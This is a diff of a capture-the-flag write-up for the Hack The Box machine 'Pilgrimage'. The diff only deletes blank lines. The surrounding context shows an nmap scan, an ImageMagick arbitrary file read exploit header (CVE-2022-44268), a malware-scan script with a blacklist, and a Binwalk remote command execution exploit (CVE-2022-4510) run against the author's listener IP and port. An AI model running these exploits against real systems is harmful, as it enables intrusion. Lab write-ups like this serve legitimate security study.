@@ -41,7 +41,6 @@ echo '10.129.70.220 pilgrimage.htb' | sudo tee -a /etc/hosts
 ## Nmap
 
 ```bash
-
 # Nmap 7.94 scan initiated Wed Jun 28 23:11:38 2023 as: nmap -sVC -p- -T4 -Pn -vv -oA pilgrimage pilgrimage.htb
 Nmap scan report for pilgrimage.htb (10.129.70.220)
 Host is up, received user-set (0.27s latency).
@@ -74,7 +73,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Wed Jun 28 23:24:12 2023 -- 1 IP address (1 host up) scanned in 753.48 seconds
 ```
 
@@ -240,28 +238,17 @@ Copied to: /home/kali/htb/Pilgrimage/git_dumper/51261.txt
 
 ┌──(kali㉿kali)-[~/htb/Pilgrimage/git_dumper]
 └─$ cat 51261.txt
-
 # Exploit Title: ImageMagick  7.1.0-49 - Arbitrary File Read
-
 # Google Dork: N/A
-
 # Date: 06/02/2023
-
 # Exploit Author: Cristian 'void' Giustini
-
 # Vendor Homepage: https://imagemagick.org/
-
 # Software Link: https://imagemagick.org/
-
 # Version: <= 7.1.0-49
-
 # Tested on: 7.1.0-49 and 6.9.11-60
-
 # CVE : CVE-2022-44268 (CVE Owner: Metabase Q Team
 https://www.metabaseq.com/imagemagick-zero-days/)
-
 # Exploit pre-requirements: Rust
-
 
 
 # PoC : https://github.com/voidz0r/CVE-2022-44268 
@@ -358,7 +345,6 @@ chmod +x ./pspy
 
 ```bash
 emily@pilgrimage:/tmp$ cat /usr/sbin/malwarescan.sh
-
 #!/bin/bash
 
 blacklist=("Executable script" "Microsoft executable")
@@ -407,22 +393,18 @@ Copied to: /home/kali/htb/Pilgrimage/51249.py
 ┌──(kali㉿kali)-[~/htb/Pilgrimage]
 └─$ python 51249.py ~/Pictures/HackerCat.jpg 10.10.14.72 1111
 
-
 ################################################
 ------------------CVE-2022-4510----------------
-
 ################################################
 --------Binwalk Remote Command Execution--------
 ------Binwalk 2.1.2b through 2.3.2 included-----
 ------------------------------------------------
-
 ################################################
 ----------Exploit by: Etienne Lacoche-----------
 ---------Contact Twitter: @electr0sm0g----------
 ------------------Discovered by:----------------
 ---------Q. Kaiser, ONEKEY Research Lab---------
 ---------Exploit tested on debian 11------------
-
 ################################################
 
 
